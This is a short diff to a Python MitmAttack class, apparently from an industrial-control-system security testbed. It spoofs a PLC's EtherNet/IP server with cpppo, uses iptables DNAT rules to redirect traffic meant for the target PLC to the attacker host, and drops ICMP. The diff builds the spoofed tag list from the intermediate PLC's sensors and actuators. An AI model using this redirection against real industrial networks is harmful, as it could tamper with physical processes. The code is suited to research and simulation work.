@@ -46,8 +46,15 @@ class MitmAttack(SyncedAttack):
         os.system('iptables -A INPUT -p icmp -j DROP')
         os.system('iptables -A OUTPUT -p icmp -j DROP')
 
-        cmd = shlex.split('/usr/bin/python2 -m cpppo.server.enip --print --address ' +
-                          self.attacker_ip + ':44818 T2:1=REAL V_ER2i:1=REAL')
+        cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip', '--print', '--address',
+               self.attacker_ip + ":44818"]
+
+        request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
+        for tag in request_tags:
+            cmd.append(str(tag) + ':1=REAL')
+
+        print("MITM 💻:", "server:", cmd)
+
         self.server = subprocess.Popen(cmd, shell=False)
 
         self.run_thread = True
@@ -142,10 +149,6 @@ class MitmAttack(SyncedAttack):
         # Delete iptables rules
         os.system('iptables -t nat -D PREROUTING -p tcp -d ' + self.target_plc_ip +
                   ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
-
-        os.system('iptables -D PREROUTING -s 192.168.1.1 -j DROP')
-        os.system('iptables -D PREROUTING -d 192.168.1.1 -j DROP')
-
         os.system('iptables -D FORWARD -p icmp -j DROP')
         os.system('iptables -D INPUT -p icmp -j DROP')
         os.system('iptables -D OUTPUT -p icmp -j DROP')
